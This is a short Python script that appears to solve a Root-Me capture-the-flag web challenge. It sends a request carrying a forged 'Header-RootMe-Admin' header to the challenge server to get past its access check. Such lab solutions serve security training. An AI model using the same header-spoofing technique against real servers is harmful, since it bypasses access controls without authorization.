#!python3
import requests
url ='http://challenge01.root-me.org/web-serveur/ch5/'
header={
    'Header-RootMe-Admin':'1'
}
r=requests.get(url,headers=header)
print(r.text)